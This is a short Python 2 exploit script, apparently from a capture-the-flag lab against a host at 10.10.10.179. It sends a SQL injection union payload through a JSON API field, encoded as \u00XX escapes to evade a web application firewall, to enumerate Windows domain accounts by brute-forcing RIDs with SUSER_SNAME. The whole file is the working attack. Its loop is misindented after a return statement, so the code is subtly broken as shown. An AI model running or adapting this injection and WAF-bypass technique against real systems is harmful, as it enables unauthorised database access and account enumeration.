import requests
import re
import json
import time

def little(string):

 t = bytearray.fromhex(string)
 t.reverse()
 return ''.join(format(x, '02x') for x in t).upper()
 url = 'http://10.10.10.179/api/getColleagues'
 c = 1100
 for x in range(1100, 6100, 1000):
   for c in range(15):
     SID = '0x0105000000000005150000001C00D1BCD181F1492BDFC236'
     JUNK = '0' + hex(x + c)[2:].upper()
     RID = SID + little(JUNK) + 4 * '0'
     print '[+] RID Is : {}'.format(RID)

     # payload = raw_input('Payload : ')

     print '[*] Counter is : {}'.format(x + c)
     payload = "-' union select 1,2,3,4,SUSER_SNAME({})-- -".format(RID)
     pattern = re.compile(r'([0-9a-f]{2})')
     print payload
     payload = pattern.sub(r"\\u00\1", payload.encode('hex'))

     # print('[+] Sending payload : {0}'.format(payload))

     r = requests.post(url, data='{"name": "' + payload + '"}',headers={'ContentType': 'application/json;charset=utf-8'})
     if '403 - Forbidden: Access is denied.' in r.text:
         print '[-] Sleeping until WAF cooldown'
         time.sleep(10)
         continue
     print r.text
     jsona = json.loads(r.text)
     try:
       if jsona:
          for element in jsona:
            del element[u'position']
            del element[u'id']
            del element[u'email']
            del element[u'name']
     except TypeError:
       if jsona:
          del jsona[u'position']
          del jsona[u'id']
          del jsona[u'email']
          del jsona[u'name']
     data = json.dumps(jsona, sort_keys=True, indent=4)
     print data
     c += 1
